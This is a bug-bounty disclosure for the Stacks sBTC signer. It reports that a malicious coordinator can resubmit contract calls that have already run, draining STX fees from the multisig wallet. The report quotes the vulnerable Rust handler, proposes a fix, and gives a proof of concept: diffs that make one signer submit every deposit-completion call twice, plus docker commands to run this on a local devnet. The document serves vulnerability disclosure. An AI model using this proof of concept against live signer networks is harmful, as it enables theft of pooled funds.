# #38398 \[BC-High] Malicious Signers can initiate repeated contract calls to cause the multi-sign wall

**Submitted on Jan 2nd 2025 at 13:36:39 UTC by @f4lc0n for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38398
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Direct loss of funds

## Description

## Brief/Intro

When a signer acts as a coordinator, it will initiate some sBTC stacks contract calls.

The problem now is that signers do not check if the call have already been made. Therefore, a malicious signer initiate contract calls that has already executed to make the multi-sign wallet lose transaction fees.

## Vulnerability Details

The `signer/src/transaction_signer.rs::handle_stacks_transaction_sign_request` code is as follow.

```rust
    async fn handle_stacks_transaction_sign_request(
        &mut self,
        request: &StacksTransactionSignRequest,
        bitcoin_chain_tip: &model::BitcoinBlockHash,
        origin_public_key: &PublicKey,
    ) -> Result<(), Error> {
        let instant = std::time::Instant::now();
        let validation_status = self
            .assert_valid_stacks_tx_sign_request(request, bitcoin_chain_tip, origin_public_key)
            .await;

        metrics::histogram!(
            Metrics::ValidationDurationSeconds,
            "blockchain" => STACKS_BLOCKCHAIN,
            "kind" => request.tx_kind(),
        )
        .record(instant.elapsed());
        metrics::counter!(
            Metrics::SignRequestsTotal,
            "blockchain" => STACKS_BLOCKCHAIN,
            "kind" => request.tx_kind(),
            "status" => if validation_status.is_ok() { "success" } else { "failed" },
        )
        .increment(1);
        validation_status?;

        // We need to set the nonce in order to get the exact transaction
        // that we need to sign.
        let wallet = SignerWallet::load(&self.context, bitcoin_chain_tip).await?;
        wallet.set_nonce(request.nonce);

        let multi_sig = MultisigTx::new_tx(&request.contract_tx, &wallet, request.tx_fee);
        let txid = multi_sig.tx().txid();

        debug_assert_eq!(txid, request.txid);

        let signature = crate::signature::sign_stacks_tx(multi_sig.tx(), &self.signer_private_key);

        let msg = message::StacksTransactionSignature { txid, signature };

        self.send_message(msg, bitcoin_chain_tip).await?;

        Ok(())
    }
```

In the above code, it checks whether the coordinator's contract call request is valid through the `assert_valid_stacks_tx_sign_request` function, but it does not check whether the contract call has been executed.

Therefore, when it is the malicious signer's turn as coordinator, it can request to execute a contract call that has already been executed. These calls will fail, but will consume the STX tokens of the multi-sign wallet.

## Impact Details

It will cause signers multi-signature wallets to lose STX tokens.

The tx fees for these failed calls are rewarded to the miner. If the malicious signer cooperates with the miner, he can steal these funds.

## References

None

## Fix

The signer should check the coordinator's call request to ensure it is not a call that has already been executed.

## Proof of Concept

## Proof of Concept

1. Base on: <https://github.com/stacks-network/sbtc/releases/tag/0.0.9-rc4>
2. Patch `signer/src/config/mod.rs`, add attacker flag config

   ```diff
        /// The minimum bitcoin block height for which the sbtc signers will
        /// backfill bitcoin blocks to.
        pub sbtc_bitcoin_start_height: Option<u64>,
   +    /// @audit;
   +    pub audit_this_signer_is_attacker: Option<bool>,
    }
    
    impl Validatable for SignerConfig {
   ```
3. Patch `signer/src/main.rs`, load attacker flag

   ```diff
        );
    
        // Load the configuration file and/or environment variables.
   -    let settings = Settings::new(args.config)?;
   +    let mut settings = Settings::new(args.config)?;
   +    std::thread::sleep(std::time::Duration::from_millis(2000)); // wait for the `docker logs` command
   +    settings.signer.audit_this_signer_is_attacker = match std::env::var("AUDIT_THIS_SIGNER_IS_ATTACKER") {
   +        Ok(value) => Some(value.parse::<bool>().unwrap()),
   +        _ => Some(false),
   +    };
   +    tracing::info!("@audit; audit_this_signer_is_attacker: {:?}", settings.signer.audit_this_signer_is_attacker);
        signer::metrics::setup_metrics(settings.signer.prometheus_exporter_endpoint);
    
        // Open a connection to the signer db.
   ```
4. Patch `docker/docker-compose.yml`, add attacker flag

   ```diff
          - postgres-3
        environment:
          <<: *sbtc-signer-environment
   +      AUDIT_THIS_SIGNER_IS_ATTACKER: true
          SIGNER_SIGNER__DB_ENDPOINT: postgresql://postgres:postgres@postgres-3:5432/signer
          SIGNER_SIGNER__PRIVATE_KEY: 3ec0ca5770a356d6cd1a9bfcbf6cd151eb1bd85c388cc00648ec4ef5853fdb7401
          SIGNER_SIGNER__P2P__SEEDS: tcp://sbtc-signer-1:4122,tcp://sbtc-signer-2:4122
   ```
5. Patch `signer/src/transaction_coordinator.rs`, add attack action

   ```diff
             if deposit_requests.is_empty() {
                 tracing::debug!("no stacks transactions to create, exiting");
                 return Ok(());
             }
    
             tracing::debug!(
                 num_deposits = %deposit_requests.len(),
                 "we have deposit requests that have been swept that may need minting"
             );
             // We need to know the nonce to use, so we reach out to our stacks
             // node for the account information for our multi-sig address.
             //
             // Note that the wallet object will automatically increment the
             // nonce for each transaction that it creates.
             let account = stacks.get_account(wallet.address()).await?;
             wallet.set_nonce(account.nonce);
    +        // @audit; start
    +        tracing::info!("@audit; repeated sumbit start");
    +        for req in deposit_requests.clone() {
    +            let outpoint = req.deposit_outpoint();
    +            let sign_request_fut =
    +                self.construct_deposit_stacks_sign_request(req, bitcoin_aggregate_key, &wallet);
    +
    +            let (sign_request, multi_tx) = match sign_request_fut.await {
    +                Ok(res) => res,
    +                Err(error) => {
    +                    tracing::error!(%error, "could not construct a transaction completing the deposit request");
    +                    continue;
    +                }
    +            };
    +
    +            // If we fail to sign the transaction for some reason, we
    +            // decrement the nonce by one, and try the next transaction.
    +            // This is not a fatal error, since we could fail to sign the
    +            // transaction because someone else is now the coordinator, and
    +            // all the signers are now ignoring us.
    +            let process_request_fut =
    +                self.process_sign_request(sign_request, chain_tip, multi_tx, &wallet);
    +
    +            let status = match process_request_fut.await {
    +                Ok(txid) => {
    +                    tracing::info!(%txid, "successfully submitted complete-deposit transaction");
    +                    "success"
    +                }
    +                Err(error) => {
    +                    tracing::warn!(
    +                        %error,
    +                        txid = %outpoint.txid,
    +                        vout = %outpoint.vout,
    +                        "could not process the stacks sign request for a deposit"
    +                    );
    +                    tracing::info!(
    +                        %error,
    +                        txid = %outpoint.txid,
    +                        vout = %outpoint.vout,
    +                        "@audit; could not process the stacks sign request for a deposit"
    +                    );
    +                    wallet.set_nonce(wallet.get_nonce().saturating_sub(1));
    +                    "failure"
    +                }
    +            };
    +
    +            metrics::counter!(
    +                Metrics::TransactionsSubmittedTotal,
    +                "blockchain" => STACKS_BLOCKCHAIN,
    +                "status" => status,
    +            )
    +            .increment(1);
    +        }
    +        tracing::info!("@audit; repeated sumbit end");
    +        // @audit; end
    
             for req in deposit_requests {
                 let outpoint = req.deposit_outpoint();
   ```
6. Run docker

   ```sh
   make devenv-up
   make devenv-down
   docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build
   make devenv-up
   ```
7. This PoC sets *sbtc-signer-3* as an attacker, which will automatically attack if it is the coordinator. It executes each contract call twice to simulate the attack scenario.
8. Keep running the demo until the trigger the coordinator is *sbtc-signer-3*.

   ```sh
   ./signers.sh demo
   ```
9. Track the transaction initiated by *sbtc-signer-3* on [explorer](https://explorer.hiro.so/address/SN3R84XZYA63QS28932XQF3G1J8R9PC3W76P9CSQS?chain=testnet\&api=http://localhost:3999), and you will find some contract calls that fail but still consume execution fees.
